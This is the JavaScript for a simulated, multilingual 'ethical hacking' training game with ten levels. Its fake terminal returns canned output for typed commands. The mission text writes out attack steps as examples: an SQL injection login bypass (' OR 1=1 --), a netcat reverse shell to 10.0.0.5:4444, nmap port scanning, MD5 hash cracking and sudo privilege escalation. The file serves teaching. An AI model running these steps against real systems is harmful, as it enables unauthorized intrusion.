const firebaseConfig = {
  apiKey: "AIzaSyAKJzdVBBSED8JEcS9dUJMh1dekfk5be4s", authDomain: "bangla-code-lab.firebaseapp.com",
  projectId: "bangla-code-lab", storageBucket: "bangla-code-lab.firebasestorage.app",
  messagingSenderId: "542355859550", appId: "1:542355859550:web:d304e461393948dcd16ccf", measurementId: "G-1FDQGT628S"
};
firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
let currentUser = null;

// লেভেল ভেরিয়েবল (ব্রাউজারে সেভ থাকবে)
let currentLevel = parseInt(localStorage.getItem('cyber_level_pro_v2')) || 1;

const translations = {
  en: { authText: "Authorized Personnel Only", loginBtn: "LOGIN WITH GOOGLE", homeBtn: "⬅ Home Page", sendBtn: "SEND", chatPh: "Type command...", sysMsg: "[SYSTEM]: Terminal ready. Type 'help' to see all commands." },
  bn: { authText: "শুধুমাত্র অনুমোদিত ব্যক্তিদের জন্য", loginBtn: "Google দিয়ে লগইন করুন", homeBtn: "⬅ হোম পেজ", sendBtn: "পাঠান", chatPh: "কমান্ড লিখুন...", sysMsg: "[সিস্টেম]: টার্মিনাল প্রস্তুত। সব কমান্ড দেখতে 'help' লিখুন।" },
  hi: { authText: "केवल अधिकृत कर्मियों के लिए", loginBtn: "Google के साथ लॉगिन", homeBtn: "⬅ होम पेज", sendBtn: "भेजें", chatPh: "कमांड लिखें...", sysMsg: "[सिस्टम]: टर्मिनल तैयार है।" },
  ar: { authText: "للأفراد المصرح لهم فقط", loginBtn: "تسجيل الدخول باستخدام Google", homeBtn: "⬅ الصفحة الرئيسية", sendBtn: "إرسال", chatPh: "اكتب الأمر...", sysMsg: "[النظام]: المحطة جاهزة." },
  ur: { authText: "صرف مجاز افراد کے لیے", loginBtn: "Google کے ساتھ لاگ ان", homeBtn: "⬅ ہوم پیج", sendBtn: "بھیجیں", chatPh: "کمانڈ لکھیں...", sysMsg: "[سسٹم]: ٹرمینل تیار ہے۔" },
  es: { authText: "Solo personal autorizado", loginBtn: "Iniciar sesión con Google", homeBtn: "⬅ Inicio", sendBtn: "Enviar", chatPh: "Escribe comando...", sysMsg: "[SISTEMA]: Terminal lista." }
};

let currentLang = localStorage.getItem('zakirhub_lang') || 'en';
function t(key) { return translations[currentLang][key] || key; }

function applyLanguage() {
  document.querySelectorAll('[data-i18n]').forEach(el => { el.innerText = t(el.getAttribute('data-i18n')); });
  document.getElementById('langSelect').value = currentLang;
  document.getElementById('chatInput').placeholder = t('chatPh');
}
function changeLanguage(lang) { currentLang = lang; localStorage.setItem('zakirhub_lang', lang); applyLanguage(); }
document.addEventListener('DOMContentLoaded', applyLanguage);

function doGoogleLogin() {
  const provider = new firebase.auth.GoogleAuthProvider();
  auth.signInWithPopup(provider).catch((error) => { 
    if (error.code === 'auth/popup-blocked') { auth.signInWithRedirect(provider); } 
  });
}

auth.onAuthStateChanged(user => {
  currentUser = user;
  if (user) {
    document.getElementById('authScreen').style.display = 'none';
    document.getElementById('app').style.display = 'flex';
    const chatBox = document.getElementById('chatMessages');
    chatBox.innerHTML = `<div class="log" style="color:#00ff00;">${t('sysMsg')}</div>`;
    setTimeout(() => { showCurrentMission(); }, 800);
  } else {
    document.getElementById('authScreen').style.display = 'flex';
    document.getElementById('app').style.display = 'none';
  }
});

// ---------- মিশন ও লেভেল লজিক ----------
function showHelp() {
  addSystemMessage("<b>=== AVAILABLE COMMANDS ===</b><br><br><b>[Networking & Web]</b><br>1. <b>ipconfig</b> - Show your IP address<br>2. <b>ping [IP]</b> - Check connection (e.g. ping 127.0.0.1)<br>3. <b>nslookup [site]</b> - Find IP of a website (DNS)<br>4. <b>curl -I [URL]</b> - Check HTTPS headers<br>5. <b>curl [URL]</b> - View HTML source code<br><br><b>[Linux & Tools]</b><br>6. <b>ls</b> - List files<br>7. <b>nano [file]</b> - Create/Edit a file<br>8. <b>chmod +x [file]</b> - Make file executable<br>9. <b>./[file]</b> - Run the file<br>10. <b>scan</b> - Scan local network<br>11. <b>nmap [IP]</b> - Port scan a target<br>12. <b>cat [file]</b> - Read file contents<br><br><b>[Hacking]</b><br>13. <b>sqli [payload]</b> - SQL Injection<br>14. <b>hashcat [hash]</b> - Crack password hash<br>15. <b>nc [IP] [Port]</b> - Reverse Shell<br>16. <b>sudo -l</b> - Check root privileges<br>17. <b>patch</b> - Secure the system<br><br><b>[System]</b><br>18. <b>clear</b> - Clear terminal screen");
}

function showCurrentMission() {
  let msg = "";
  switch(currentLevel) {
    case 1: msg = "🎯 <b>LEVEL 1: IP ADDRESS (Networking)</b><br>Objective: Every device has an IP. Find yours.<br><b>Command:</b> Type <code>ipconfig</code>"; break;
    case 2: msg = "🎯 <b>LEVEL 2: PING (Connectivity)</b><br>Objective: Check if your local loopback (127.0.0.1) is alive.<br><b>Command:</b> Type <code>ping 127.0.0.1</code>"; break;
    case 3: msg = "🎯 <b>LEVEL 3: DNS & HTTPS (Web Basics)</b><br>Objective: Find the IP of google.com and check its secure headers.<br><b>Commands:</b> Type <code>nslookup google.com</code> then <code>curl -I https://google.com</code>"; break;
    case 4: msg = "🎯 <b>LEVEL 4: HTML (Web Structure)</b><br>Objective: View the HTML source code of the target server.<br><b>Command:</b> Type <code>curl http://192.168.1.42</code>"; break;
    case 5: msg = "🎯 <b>LEVEL 5: LINUX TOOLS (File Creation)</b><br>Objective: Create a hacking script, make it executable, and run it.<br><b>Commands:</b><br>1. <code>nano hack.sh</code><br>2. <code>chmod +x hack.sh</code><br>3. <code>./hack.sh</code>"; break;
    case 6: msg = "🎯 <b>LEVEL 6: NETWORK RECON</b><br>Objective: Scan the network to find live hosts.<br><b>Command:</b> Type <code>scan</code>"; break;
    case 7: msg = "🎯 <b>LEVEL 7: PORT SCANNING</b><br>Objective: Scan the target (192.168.1.42) for open ports.<br><b>Command:</b> Type <code>nmap 192.168.1.42</code>"; break;
    case 8: msg = "🎯 <b>LEVEL 8: LOG ANALYSIS & SQLi</b><br>Objective: Read the logs, then bypass the admin login.<br><b>Commands:</b> Type <code>cat access.log</code> then <code>sqli ' OR 1=1 --</code>"; break;
    case 9: msg = "🎯 <b>LEVEL 9: HASH CRACKING</b><br>Objective: Crack the admin hash found in the database.<br><b>Hash:</b> <code>5d41402abc4b2a76b9719d911017c592</code><br><b>Command:</b> Type <code>hashcat 5d41402abc4b2a76b9719d911017c592</code>"; break;
    case 10: msg = "🎯 <b>LEVEL 10: ROOT & DEFENSE</b><br>Objective: Get root access, then patch the system to secure it.<br><b>Commands:</b><br>1. <code>nc 10.0.0.5 4444</code><br>2. <code>sudo -l</code><br>3. <code>patch</code>"; break;
    default: msg = "🏆 <b>CONGRATULATIONS!</b><br>You have completed all 10 levels and earned the title of <b>Professional Ethical Hacker</b>! 🛡️<br>You now understand Networking, Web Basics, Linux Tools, and Hacking.<br><br><i>Next step: Try TryHackMe or HackTheBox for real-world practice.</i>"; break;
  }
  addSystemMessage(msg);
}

function addSystemMessage(htmlText) {
  const chatBox = document.getElementById('chatMessages');
  const div = document.createElement('div');
  div.className = 'log';
  div.style.color = '#00ff00';
  div.innerHTML = `<span class="user">[SYSTEM]:</span> <span class="text">${htmlText}</span>`;
  chatBox.appendChild(div);
  chatBox.scrollTop = chatBox.scrollHeight;
}

function completeLevel(level, nextMsg) {
  if (currentLevel === level) {
    currentLevel++;
    localStorage.setItem('cyber_level_pro_v2', currentLevel);
    addSystemMessage(`✅ <b>LEVEL ${level} COMPLETE!</b><br>${nextMsg}`);
    setTimeout(() => { showCurrentMission(); }, 1500);
  }
}

// ---------- কমান্ড প্রসেসিং ----------
function sendMessage() {
  const input = document.getElementById('chatInput'); 
  const text = input.value.trim();
  if (!text) return; 
  input.value = ''; 

  const cmd = text.toLowerCase().trim();
  addSystemMessage(`<span style="color:#fff;">root@scout:~# ${escapeHtml(text)}</span>`);

  if (cmd === 'clear') { document.getElementById('chatMessages').innerHTML = ''; return; }
  if (cmd === 'help') { showHelp(); return; }

  // Level 1: IP Address
  if (cmd === 'ipconfig' || cmd === 'ifconfig') {
    addSystemMessage("eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;<br>inet <b>192.168.1.99</b> netmask 255.255.255.0 broadcast 192.168.1.255");
    if (currentLevel === 1) completeLevel(1, "Great! Now test your connection.");
    return;
  }

  // Level 2: Ping
  if (cmd.startsWith('ping ')) {
    if (cmd.includes('127.0.0.1')) {
      addSystemMessage("PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.<br>64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms<br>64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.041 ms<br>--- 127.0.0.1 ping statistics ---<br>2 packets transmitted, 2 received, 0% packet loss");
      if (currentLevel === 2) completeLevel(2, "Connection successful! Now learn about DNS.");
    } else {
      addSystemMessage(`PING ${escapeHtml(text.split(' ')[1])}...<br>Request timed out. (Try 127.0.0.1)`);
    }
    return;
  }

  // Level 3: DNS & HTTPS
  if (cmd.startsWith('nslookup ')) {
    addSystemMessage(`Server:  8.8.8.8<br>Address: 8.8.8.8#53<br><br>Non-authoritative answer:<br>Name:    google.com<br>Address: <b>142.250.190.46</b>`);
    if (currentLevel === 3) addSystemMessage("Now check if it uses HTTPS. Type: <code>curl -I https://google.com</code>");
    return;
  }
  if (cmd === 'curl -i https://google.com') {
    addSystemMessage("HTTP/2 200<br>content-type: text/html; charset=ISO-8859-1<br>strict-transport-security: max-age=31536000<br><span style='color:#00ff00;'>[HTTPS is SECURE]</span>");
    if (currentLevel === 3) completeLevel(3, "You understand DNS and HTTPS! Let's look at HTML.");
    return;
  }

  // Level 4: HTML
  if (cmd === 'curl http://192.168.1.42') {
    addSystemMessage("&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;title&gt;Target Admin Panel&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1&gt;Welcome to Admin&lt;/h1&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;");
    if (currentLevel === 4) completeLevel(4, "You've seen the HTML. Now let's create a file using Linux tools.");
    return;
  }

  // Level 5: Linux Tools
  if (cmd.startsWith('nano ')) {
    addSystemMessage(`[File '${escapeHtml(text.split(' ')[1])}' created and saved]`);
    if (currentLevel === 5) addSystemMessage("Now make it executable: <code>chmod +x hack.sh</code>");
    return;
  }
  if (cmd.startsWith('chmod ')) {
    addSystemMessage(`[Permissions updated]`);
    if (currentLevel === 5) addSystemMessage("Now run it: <code>./hack.sh</code>");
    return;
  }
  if (cmd === './hack.sh') {
    addSystemMessage("Executing hack.sh...<br>Tool initialized.<br>Bypassing firewall... SUCCESS.");
    if (currentLevel === 5) completeLevel(5, "Excellent! You now know how to use Linux tools.");
    return;
  }

  // Level 6: Network Scan
  if (cmd === 'scan') {
    addSystemMessage("Scanning 192.168.1.0/24...<br>➔ Host 192.168.1.1 (Router)<br>➔ Host 192.168.1.42 (Target - <span style='color:red;'>SUSPICIOUS</span>)<br>➔ Host 192.168.1.99 (Your Machine)");
    if (currentLevel === 6) completeLevel(6, "Target acquired: 192.168.1.42. Scan its ports.");
    return;
  }

  // Level 7: Port Scan
  if (cmd.startsWith('nmap ')) {
    if (cmd.includes('192.168.1.42')) {
      addSystemMessage("PORT   STATE SERVICE<br>22/tcp open  ssh<br><span style='color:red;'>80/tcp open  http</span>");
      if (currentLevel === 7) completeLevel(7, "Web server found on port 80. Check the logs.");
    } else { addSystemMessage("❌ Wrong target."); }
    return;
  }

  // Level 8: Log & SQLi
  if (cmd === 'cat access.log') {
    addSystemMessage("192.168.1.42 - GET /admin.php<br>192.168.1.42 - GET /backup.zip<br>192.168.1.42 - GET /login.php");
    if (currentLevel === 8) addSystemMessage("Now bypass the login using SQL Injection: <code>sqli ' OR 1=1 --</code>");
    return;
  }
  if (cmd.startsWith('sqli ')) {
    if (cmd.includes("' or 1=1 --") || cmd.includes("' or 1=1--")) {
      addSystemMessage("Injecting payload...<br>[SUCCESS] Logged in as Admin!<br>Hash: <code>5d41402abc4b2a76b9719d911017c592</code>");
      if (currentLevel === 8) completeLevel(8, "Hash found! Crack it using hashcat.");
    } else { addSystemMessage("❌ Login failed. Try ' OR 1=1 --"); }
    return;
  }

  // Level 9: Hashcat
  if (cmd.startsWith('hashcat ')) {
    if (cmd.includes('5d41402abc4b2a76b9719d911017c592')) {
      addSystemMessage("Cracking MD5...<br>Result: <b style='color:#00ffff;'>hello</b>");
      if (currentLevel === 9) completeLevel(9, "Cracked! Now gain root access and patch.");
    } else { addSystemMessage("❌ Invalid hash."); }
    return;
  }

  // Level 10: Reverse Shell & Defense
  if (cmd.startsWith('nc ')) {
    if (cmd.includes('10.0.0.5') && cmd.includes('4444')) {
      addSystemMessage("Reverse shell connected to 10.0.0.5:4444...");
      if (currentLevel === 10) addSystemMessage("Now check root access: <code>sudo -l</code>");
    } else { addSystemMessage("❌ Connection refused."); }
    return;
  }
  if (cmd === 'sudo -l') {
    addSystemMessage("User may run: (ALL) NOPASSWD: /usr/bin/find<br><span style='color:yellow;'>[VULNERABLE]</span> Escalate to root!");
    if (currentLevel === 10) addSystemMessage("You are root! Now secure the server: <code>patch</code>");
    return;
  }
  if (cmd === 'patch') {
    addSystemMessage("Updating system...<br>Fixing SQLi...<br>Closing ports...<br><span style='color:#00ff00;'>✅ System Secured.</span>");
    if (currentLevel === 10) completeLevel(10, "You have successfully defended the network!");
    return;
  }

  addSystemMessage(`❌ Command not found: <b>${escapeHtml(text)}</b>. Type <code>help</code> for commands.`);
}

function clearTerminal() { document.getElementById('chatMessages').innerHTML = ''; }
function escapeHtml(s) { return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }